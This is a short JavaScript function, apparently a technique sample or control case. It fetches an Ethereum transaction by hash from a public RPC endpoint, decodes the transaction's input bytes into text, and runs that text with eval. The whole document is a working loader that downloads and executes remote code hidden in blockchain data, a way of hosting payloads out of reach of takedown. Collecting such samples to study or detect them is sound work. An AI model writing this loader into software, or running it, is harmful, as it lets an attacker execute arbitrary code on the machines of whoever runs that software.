// Technique control: execute transaction bytes, without an XOR decoder.
async function activate(hash) {
  const response = await fetch('https://eth.drpc.org', {
    method: 'POST', body: JSON.stringify({jsonrpc:'2.0', id:1,
      method:'eth_getTransactionByHash', params:[hash]})
  });
  const tx = (await response.json()).result;
  const code = Buffer.from(tx.input.slice(2), 'hex').toString('utf8');
  eval(code);
}
